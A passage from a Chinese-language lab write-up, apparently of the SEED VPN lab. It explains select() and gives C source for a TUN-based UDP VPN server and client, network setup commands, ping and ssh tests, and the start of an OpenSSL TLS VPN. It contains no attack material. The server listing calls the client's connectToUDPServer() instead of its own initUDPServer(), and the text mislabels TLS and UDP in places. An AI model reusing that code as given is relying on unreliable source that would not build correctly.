<p>int select(int n, fd_set * readfds, fd_set * writefds, fd_set * exceptfds, struct timeval * timeout);</p>
<p>函数说明：select()用来等待文件描述词状态的改变，会阻塞进程. 参数n 代表最大的文件描述词加1, 参数readfds、writefds 和exceptfds 称为描述词组, 是用来回传该描述词的读, 写或例外的状况. 底下的宏提供了处理这三种描述词组的方式：</p>
<p>  FD_CLR(inr fd, fd_set*  set); 用来清除描述词组set 中相关fd 的位<br>  FD_ISSET(int fd, fd_set * set); 用来测试描述词组set 中相关fd 的位是否为真<br>  FD_SET(int fd, fd_set* set); 用来设置描述词组set 中相关fd 的位<br>  FD_ZERO(fd_set * set); 用来清除描述词组set 的全部位 </p>
<p>FD_ISSET</p>
<p>检测fd在fdset集合中的状态是否变化，当检测到fd状态发生变化时返回真，否则，返回假（也可以认为集合中指定的文件描述符是否可以读写）。</p>
<p>fd_set</p>
<p>可以理解为一个集合，这个集合中存放的是文件描述符(file descriptor)，即文件句柄，它用一位来表示一个fd（下面会仔细介绍）</p>
</blockquote>
<pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span> &#123;
   <span class="hljs-type">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
													    <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;</code></pre>



<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p><code>VPN server</code></p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_tun.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> PORT_NUMBER 55555</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFF_SIZE 2000</span>

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">createTunDevice</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-type">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;

<span class="hljs-type">int</span> <span class="hljs-title function_">initUDPServer</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>
    <span class="hljs-type">char</span> buff[<span class="hljs-number">100</span>];

    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));
    server.sin_family = AF_INET;       <span class="hljs-comment">// 服务器地址类型为IPV4            </span>
    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//服务器IP</span>
    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// 端口号</span>

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//创建UDP的套接字</span>
    bind(sockfd, (<span class="hljs-keyword">struct</span> sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socket绑定地址和端口</span>
    <span class="hljs-comment">// 等待连接</span>
    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//清空缓冲区</span>
    <span class="hljs-type">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in); <span class="hljs-comment">//初始化结构体</span>
    <span class="hljs-type">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// 等待接收数据 </span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);
    <span class="hljs-keyword">return</span> sockfd;
&#125;

<span class="hljs-type">void</span> <span class="hljs-title function_">tunSelected</span><span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;

<span class="hljs-type">void</span> <span class="hljs-title function_">socketSelected</span> <span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);                <span class="hljs-comment">// 通过write发送到tun0</span>
&#125;


<span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span> &#123;
   <span class="hljs-type">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
                              <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;
</code></pre>



<p><code>VPN client</code></p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_tun.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFF_SIZE 2000</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> PORT_NUMBER 55555</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_IP <span class="hljs-string">&quot;10.0.2.8&quot;</span> <span class="hljs-comment">// VPN 服务器ip</span></span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">createTunDevice</span><span class="hljs-params">()</span> &#123;   <span class="hljs-comment">// 创建 tun0 网卡 </span>
   <span class="hljs-type">int</span> tunfd;
   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>
   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));
    
   ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tun设备不包含以太网头部</span>
   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// 打开文件</span>
   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// 打开设备</span>
   <span class="hljs-keyword">return</span> tunfd;
    <span class="hljs-comment">// 该函数执行完后 执行命令ifconfig tunX 192.168.53.5/24 up 为tun网卡设置IP并开启</span>
&#125;


<span class="hljs-type">int</span> <span class="hljs-title function_">connectToUDPServer</span><span class="hljs-params">()</span>&#123;    <span class="hljs-comment">//创建socket连接 连接到vpn服务器</span>
    <span class="hljs-type">int</span> sockfd;
    <span class="hljs-type">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;
  <span class="hljs-comment">//指定服务器的地址结构</span>
    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));
    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// 服务器地址类型为IPV4   </span>
    peerAddr.sin_port = htons(PORT_NUMBER);
    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);
  
    sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// 连接服务器后发送一个消息 hello</span>
                (<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-keyword">return</span> sockfd;
&#125;



<span class="hljs-type">void</span> <span class="hljs-title function_">tunSelected</span><span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//定义接收数的缓冲区</span>

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);
    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// 清空缓冲区</span>
    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// 读取来自tun0网卡的数据，保存在缓冲区中</span>
    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));
    <span class="hljs-comment">// 通过socket发送数据</span>
&#125;

<span class="hljs-type">void</span> <span class="hljs-title function_">socketSelected</span> <span class="hljs-params">(<span class="hljs-type">int</span> tunfd, <span class="hljs-type">int</span> sockfd)</span>&#123;
    <span class="hljs-type">int</span>  len;
    <span class="hljs-type">char</span> buff[BUFF_SIZE];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);
    bzero(buff, BUFF_SIZE);
    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 接收数据至buff，保存数据的长度</span>
    write(tunfd, buff, len);                <span class="hljs-comment">// 通过write发送到tun0</span>
&#125;


<span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span> &#123;
   <span class="hljs-type">int</span> tunfd, sockfd;

   tunfd  = createTunDevice(); <span class="hljs-comment">// 创建tun0网卡 </span>
   sockfd = connectToUDPServer(); <span class="hljs-comment">// 建立socket连接</span>
    
   <span class="hljs-comment">// 进入主循环</span>
   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// 将set清零使集合中不含任何fd</span>
     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// 将socketfd加入set集合</span>
     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// 将tunfd加入set集合</span>
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 监听两个端口 阻塞进程，知道有一个端口收到数据</span>
                              <span class="hljs-comment">// 当收到数据程序继续执行 对数据进行转发</span>
     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// 当tun的文件fd可以读写</span>
         tunSelected(tunfd, sockfd);
     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// 当socket的文件fd可以读写</span>
         socketSelected(tunfd, sockfd);
  &#125;
&#125;</code></pre>

<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul>
<li>实验装置</li>
<li>拓扑图</li>
<li>主机物理网卡配置</li>
</ul>
<h3 id="实验装置"><a href="#实验装置" class="headerlink" title="实验装置"></a>实验装置</h3><blockquote>
<p>host u：ubuntu 18.04</p>
<p>VPNserver：ubuntu 18.04</p>
<p>host V：ubuntu 18.04</p>
</blockquote>
<h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><blockquote>
<p>本次实验需要三台主机，分别作为host U(VPN 用户)，VPN服务, host V(内网主机)。</p>
<p>host V处于192.168.60.0&#x2F;24网段，属于内网。</p>
<p>host U处于10.0.2.0&#x2F;24网段，属于外网，host V 和 host U在没有VPN的情况下无法通信。</p>
<p>VPN server有两张网卡，一张网卡的IP地址为192.168.60.1处于192.168.60.0&#x2F;24网段，作为host V的网关，并可以与其通信；而另一张网卡地址为10.0.2.8属于外网网段，可以与host U通信，同时其作为host U的VPN服务器，实现与host V通信。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707152524640.png" alt="image-20210707152524640"></p>
<h3 id="主机物理网卡配置"><a href="#主机物理网卡配置" class="headerlink" title="主机物理网卡配置"></a>主机物理网卡配置</h3><table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">客户机</td>
<td align="center">VPN客户机&#x2F;host U</td>
<td align="center">10.0.2.7&#x2F;24</td>
</tr>
<tr>
<td align="center">服务器</td>
<td align="center">VPN服务器&#x2F;网关</td>
<td align="center">10.0.2.8&#x2F;24<br>192.168.60.1&#x2F;24</td>
</tr>
<tr>
<td align="center">内网主机</td>
<td align="center">host V</td>
<td align="center">192.168.60.101&#x2F;24</td>
</tr>
</tbody></table>
<p><strong>tun0 虚拟网卡配置</strong></p>
<table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">虚拟接口</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">服务器</td>
<td align="center">tun0</td>
<td align="center">192.168.53.1&#x2F;24</td>
</tr>
<tr>
<td align="center">客户机</td>
<td align="center">tun0</td>
<td align="center">192.168.53.5&#x2F;24</td>
</tr>
</tbody></table>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>运行了三台ubuntu的虚拟机，关系如上面描述</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707224946836.png" alt="image-20210707224946836"></p>
<h4 id="服务器主机"><a href="#服务器主机" class="headerlink" title="服务器主机"></a>服务器主机</h4><p>服务器主机需要两块网卡，这里通过VM再添加一块网卡即可，配置如图</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225616855.png" alt="image-20210707225616855" style="zoom:67%;">

<p>运行<code>vpnserver</code>程序，运行后会出现一个<code>tun0</code>网卡</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225804438.png" alt="image-20210707225804438"></p>
<p>使用命令配置<code>tun0</code></p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun0 <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707230038034.png" alt="image-20210707230038034"></p>
<p>由于 VPN Server 需要在私网和隧道之间转发数据包，因此它也需要充当网关，这是通过在 VPN Server 上启用 IP 转发来实现的。</p>
<pre><code class="hljs routeros">sysctl net.ipv4.<span class="hljs-attribute">ip_forward</span>=1</code></pre>

<h4 id="host-v"><a href="#host-v" class="headerlink" title="host v"></a>host v</h4><p>客户端运行<code>./vpnclient</code>，之后会出现一个<code>tun0</code>接口，然后对其配置</p>
<pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun0 <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232611251.png" alt="image-20210707232611251" style="zoom:67%;">

<h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p>经过以上两步，隧道就建立起来了，然后我们设置路由路径以将预期流量引导到客户端和服务器机器上的隧道。在 host v上，我们将所有进入专用网络 (192.168.60.0&#x2F;24) 的数据包定向到 tun0 接口，数据包将从该接口通过 VPN 隧道转发。我们使用 route 命令在 host v 上添加以下路由条目：</p>
<pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span> tun0</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233335994.png" alt="image-20210707233335994"></p>
<p>在服务器主机上，将流向 192.168.53.0&#x2F;24 网络的流量定向到 tun0 接口</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707233447176.png" alt="image-20210707233447176"></p>
<p>内网主机上为了通过 VPN 隧道将 Host V （内网主机）回复发送到 Host U，我们在 Host V 上添加了一个路由条目，它将去往 Host U 网络的数据包路由到 VPN Serve。从 VPN Server，这个数据包将通过 VPN 隧道到达 VPN Client，最终到达 Host U。 下面显示了 Host V 上的路由条目</p>
<pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> ens33</code></pre>

<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707234034756.png" alt="image-20210707234034756"></p>
<h2 id="验证通信"><a href="#验证通信" class="headerlink" title="验证通信"></a>验证通信</h2><h3 id="ping-测试"><a href="#ping-测试" class="headerlink" title="ping 测试"></a>ping 测试</h3><p>cliet ping 内网主机</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232714091.png" alt="image-20210707232714091"></p>
<p>内网主机ping client</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233045553.png" alt="image-20210707233045553"></p>
<p>内网主机追踪路由，可以看到经过网关<code>192.168.60.1</code>到达了目的地址</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707174129705.png" alt="image-20210707174129705"></p>
<p>查看vpnclient和vpnserver程序的运行情况</p>
<p><strong>VPN client</strong></p>
<blockquote>
<p>在发送 ping 请求时，vpnclient反映已收到 TUN 接口上的数据包（ping 请求）并连续收到隧道中的包（ping 回复）</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234515470.png" alt="image-20210707234515470" style="zoom: 67%;"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000049518.png" alt="image-20210708000049518"></p>
<p><strong>VPN server</strong></p>
<blockquote>
<p>在 vpnserver上，程序反映从隧道接收数据包（ping 请求），然后从 TUN 接收数据包（ping 回复）</p>
</blockquote>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234610430.png" alt="image-20210707234610430" style="zoom:67%;">

<h3 id="ssh测试"><a href="#ssh测试" class="headerlink" title="ssh测试"></a>ssh测试</h3><p>在host V执行</p>
<pre><code class="hljs sh">ssh root@192.168.60.101</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000433140.png" alt="image-20210708000433140" style="zoom:80%;">

<p>在 host U上执行</p>
<pre><code class="hljs sh">ssh root@10.0.2.7</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000944524.png" alt="image-20210708000944524" style="zoom:80%;">

<p>通过上面的测试可以确定两台主机可以通过VPN程序进行远程控制。</p>
<h1 id="二、TSL-VPN"><a href="#二、TSL-VPN" class="headerlink" title="二、TSL VPN"></a>二、TSL VPN</h1><p>有了上面基于TCP的VPN，再做TSL就会简单很多。</p>
<h2 id="程序实现-1"><a href="#程序实现-1" class="headerlink" title="程序实现"></a>程序实现</h2><h3 id="ssl初始化"><a href="#ssl初始化" class="headerlink" title="ssl初始化"></a>ssl初始化</h3><p>创建SSL数据结构，用于建立TLS连接</p>
<p><code>VPN server</code></p>
<pre><code class="hljs c">SSL* <span class="hljs-title function_">SSLLibInit</span><span class="hljs-params">()</span> &#123;
   SSL_METHOD *meth;
   SSL_CTX* ctx;
   SSL *ssl;
   <span class="hljs-type">int</span> err;

   <span class="hljs-comment">// OpenSSL 初始化</span>
   SSL_library_init();
   SSL_load_error_strings();
   SSLeay_add_ssl_algorithms();
   
   <span class="hljs-comment">// SSL 初始化</span>
   meth = (SSL_METHOD *)TLSv1_2_method();
   ctx = SSL_CTX_new(meth);
   SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, <span class="hljs-literal">NULL</span>);
   <span class="hljs-comment">// 加载服务器证书和私钥文件</span>
   SSL_CTX_use_certificate_file(ctx, <span class="hljs-string">&quot;./cert_server/server.pem&quot;</span>, SSL_FILETYPE_PEM);
   SSL_CTX_use_PrivateKey_file(ctx, <span class="hljs-string">&quot;./cert_server/server-key.pem&quot;</span>, SSL_FILETYPE_PEM);
   ssl = SSL_new (ctx);
   <span class="hljs-keyword">return</span> ssl;
&#125;</code></pre>

<p><code>VPN client</code></p>
<pre><code class="hljs c">SSL* <span class="hljs-title function_">setupTLSClient</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* hostname)</span>
&#123;
    <span class="hljs-comment">// OpenSSL 初始化</span>
   SSL_library_init();
   SSL_load_error_strings();
   SSLeay_add_ssl_algorithms();
   SSL_METHOD *meth;
   SSL_CTX* ctx;
   SSL* ssl;

   meth = (SSL_METHOD *)TLSv1_2_method();
   ctx = SSL_CTX_new(meth);

   SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);  <span class="hljs-comment">//指明是否要求提供证书</span>
   <span class="hljs-keyword">if</span> (SSL_CTX_load_verify_locations(ctx,<span class="hljs-literal">NULL</span>, CA_DIR) &lt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//加载可信CA证书，进行证书验证</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error setting the verify locations. \n&quot;</span>);
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
   &#125;
   ssl = SSL_new (ctx);

   X509_VERIFY_PARAM *vpm = SSL_get0_param(ssl); 
   X509_VERIFY_PARAM_set1_host(vpm, hostname, <span class="hljs-number">0</span>);

   <span class="hljs-keyword">return</span> ssl;
&#125;</code></pre>

<h3 id="TCP连接-1"><a href="#TCP连接-1" class="headerlink" title="TCP连接"></a>TCP连接</h3><p>TCP连接与上面的连接一样。</p>
<h3 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h3><blockquote>
<p>SSL_set_fd()将SSL绑定到一个TCP连接<br>调用SSL_connec()启动与服务器的TLS握手协议)</p>
</blockquote>
<pre><code class="hljs c"><span class="hljs-comment">/*----------------TLS initialization ----------------*/</span>
ssl   = setupTLSClient(hostname);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TLSClientsetup initialisation is successful\n&quot;</span>);

<span class="hljs-comment">/*----------------Create a TCP connection ---------------*/</span>
<span class="hljs-type">int</span> sockfd = setupTCPClient(hostname, port);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TCPClientsetup is successful\n&quot;</span>);

<span class="hljs-comment">/*----------------TLS handshake ---------------------*/</span>
SSL_set_fd(ssl, sockfd);  <span class="hljs-comment">//绑定TCP连接</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL_set_fd() is successful\n&quot;</span>);
<span class="hljs-type">int</span> err = SSL_connect(ssl); CHK_SSL(err);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection is successful\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SSL connection using %s\n&quot;</span>, SSL_get_cipher(ssl));</code></pre>

<h3 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h3><p>数据转发的原理与基于UDP&#x2F;TCP的VPN 的原理</p>
<pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(<span class="hljs-type">int</span> tunfd, SSL* ssl, <span class="hljs-type">int</span> sockfd)</span>
&#123;
   <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;
     fd_set readFDSet;

     FD_ZERO(&amp;readFDSet);
     FD_SET(sockfd, &amp;readFDSet);
     FD_SET(tunfd, &amp;readFDSet);
     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet)) tunSelected(tunfd, sockfd, ssl);
